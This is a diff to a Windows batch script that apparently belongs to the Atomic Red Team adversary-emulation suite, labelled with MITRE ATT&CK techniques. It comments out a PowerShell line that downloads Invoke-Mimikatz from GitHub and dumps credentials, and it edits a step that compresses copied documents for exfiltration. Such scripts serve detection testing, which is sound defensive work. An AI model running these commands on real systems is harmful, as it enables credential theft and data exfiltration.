@@ -18,7 +18,7 @@ SCHTASKS /Delete /TN "Atomic Testing" /F
 :: Tactics: Execution
 :: Technique: PowerShell https://attack.mitre.org/wiki/Technique/T1086
 
-powershell.exe "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/dev/data/module_source/credentials/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds"
+::powershell.exe "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/dev/data/module_source/credentials/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds"
 
 :: Tactics: Defense Evasion
 :: Technique: Timestomp https://attack.mitre.org/wiki/Technique/T1099
@@ -50,7 +50,7 @@ PowerShell.exe -enc JABmAGkAbABlAD0AKABnAGkAIAB0AGUAcwB0AC4AdAB4AHQAKQA7ACQAZABh
 
 :: Single Endpoint
 
-@FOR /F "tokens=1,2" %%i in ('qwinsta /server:<COMPUTERNAME> ^| findstr "Active Disc"') do @echo %%i | find /v "#" | find /v "console" || echo %%j > usernames.txt
+::@FOR /F "tokens=1,2" %%i in ('qwinsta /server:<COMPUTERNAME> ^| findstr "Active Disc"') do @echo %%i | find /v "#" | find /v "console" || echo %%j > usernames.txt
 
 :: Multiple Endpoints
 
@@ -89,4 +89,4 @@ for /R c: %%f in (*.docx) do copy %%f c:\temp\
 :: Tactic: Exfiltration
 :: Technique: Data Compressed: https://attack.mitre.org/wiki/Technique/T1002
 
-cmd.exe /c powershell.exe Compress-Archive -Path C:\temp\* -CompressionLevel Optimal -DestinationPath C:\temp\allthedataz.zip
+cmd.exe /c powershell.exe Compress-Archive -Path C:\temp\* -CompressionLevel Optimal -DestinationPath C:\temp\allthedataz.zip ; Import-Module C:\AtomicRedTeam\execution-frameworks\Invoke-AtomicRedTeam\Invoke-AtomicRedTeam\Invoke-AtomicRedTeam.psm1 ; Invoke-AtomicTest T1086
